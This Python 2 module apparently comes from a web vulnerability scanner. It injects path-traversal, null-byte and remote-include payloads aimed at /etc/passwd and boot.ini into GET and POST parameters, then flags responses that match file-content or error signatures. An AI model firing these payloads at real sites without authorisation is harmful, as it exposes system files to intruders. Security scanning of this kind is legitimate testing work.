from attack import Attack
from vulnerability import Vulnerability

class FileHandlingAttack(Attack):

  payloads = ["http://www.google.fr/",
              "/etc/passwd", "/etc/passwd\0", "c:\\\\boot.ini", "c:\\\\boot.ini\0",
              "../../../../../../../../../../etc/passwd", # /.. is similar to / so one such payload is enough :)
              "../../../../../../../../../../etc/passwd\0", # same with null byte
              "../../../../../../../../../../boot.ini",
              "../../../../../../../../../../boot.ini\0"]

  def __init__(self,HTTP,xmlRepGenerator,):
    Attack.__init__(self,HTTP,xmlRepGenerator)

  def __findPatternInResponse(self,data,inc,warn):
    err = ""
    if data.find("root:x:0:0")>=0:
      err="Unix include/fread"
      inc=1
    if data.find("[boot loader]")>=0:
      err="Windows include/fread"
      inc=1
    if data.find("<title>Google</title>")>0:
      err="Remote include"
      inc=1
    if data.find("java.io.FileNotFoundException:")>=0 and warn==0:
      err="Warning Java include/open"
      warn=1
    if data.find("fread(): supplied argument is not")>0 and warn==0:
      err="Warning fread"
      warn=1
    if data.find("fpassthru(): supplied argument is not")>0 and warn==0:
      err="Warning fpassthru"
      warn=1
    if data.find("for inclusion (include_path=")>0 and warn==0:
      err="Warning include"
      warn=1
    if data.find("Failed opening required")>=0 and warn==0:
      err="Warning require"
      warn=1
    if data.find("<b>Warning</b>:  file(")>=0 and warn==0:
      err="Warning file()"
      warn=1
    if data.find("<b>Warning</b>:  file_get_contents(")>=0:
      err="Warning file_get_contents()"
      warn=1
    return err,inc,warn

  def attackGET(self,page,dict,attackedGET):
    if dict=={}:
      warn=0
      inc=0
      err500=0
      for payload in self.payloads:
        err=""
        url=page+"?"+self.HTTP.quote(payload)
        if url not in attackedGET:
          if self.verbose==2:
            print "+ "+url
          attackedGET.append(url)
          if inc==1: continue
          data,code=self.HTTP.send(url).getPageCode()
          err,inc,warn = self.__findPatternInResponse(data,inc,warn)
          if err!="":
            self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                              url,self.HTTP.quote(payload),
                              str(err)+" (QUERY_STRING) in "+str(page))
            print err,"(QUERY_STRING) in",page
            print "\tEvil url:",url
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                                Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                url,self.HTTP.quote(payload),
                                "500 HTTP Error code")
              print "500 HTTP Error code with"
              print "\tEvil url:",url
    for k in dict.keys():
      warn=0
      inc=0
      err500=0
      for payload in self.payloads:
        err=""
        tmp=dict.copy()
        tmp[k]=payload
        url=page+"?"+self.HTTP.encode(tmp)
        if url not in attackedGET:
          if self.verbose==2:
            print "+ "+url
          attackedGET.append(url)
          if inc==1: continue
          data,code=self.HTTP.send(url).getPageCode()
          err,inc,warn = self.__findPatternInResponse(data,inc,warn)
          if err!="":
            if self.color==0:
              self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                                Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                url,self.HTTP.encode(tmp),err+" ("+k+")")
              print err,"("+k+") in",page
              print "\tEvil url:",url
            else:
              self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                                Vulnerability.HIGH_LEVEL_VULNERABILITY,url,self.HTTP.encode(tmp),
                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                                Vulnerability.HIGH_LEVEL_VULNERABILITY,url,self.HTTP.encode(tmp),
                                "500 HTTP Error code")
              print "500 HTTP Error code with"
              print "\tEvil url:",url

  def attackPOST(self,form):
    page=form[0]
    dict=form[1]
    err=""
    for payload in self.payloads:
      warn=0
      inc=0
      err500=0
      for k in dict.keys():
        tmp=dict.copy()
        tmp[k]=payload
        if (page,tmp) not in self.attackedPOST:
          self.attackedPOST.append((page,tmp))
          if inc==1: continue
          headers={"Accept": "text/plain"}
          if self.verbose==2:
            print "+ "+page
            print "  ",tmp
          data,code=self.HTTP.send(page,self.HTTP.encode(tmp),headers).getPageCode()
          err,inc,warn = self.__findPatternInResponse(data,inc,warn)
          if err!="":
            self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                              Vulnerability.HIGH_LEVEL_VULNERABILITY,
                              page,self.HTTP.encode(tmp),
                              err+" coming from "+form[2])
            print err,"in",page
            print "  with params =",self.HTTP.encode(tmp)
            print "  coming from",form[2]
          else:
            if code==500 and err500==0:
              err500=1
              self.reportGen.logVulnerability(Vulnerability.FILE_HANDLING,
                                Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                page,self.HTTP.encode(tmp),
                                "500 HTTP Error coming from "+form[2])
              print "500 HTTP Error code in",page
              print "  with params =",self.HTTP.encode(tmp)
              print "  coming from",form[2]

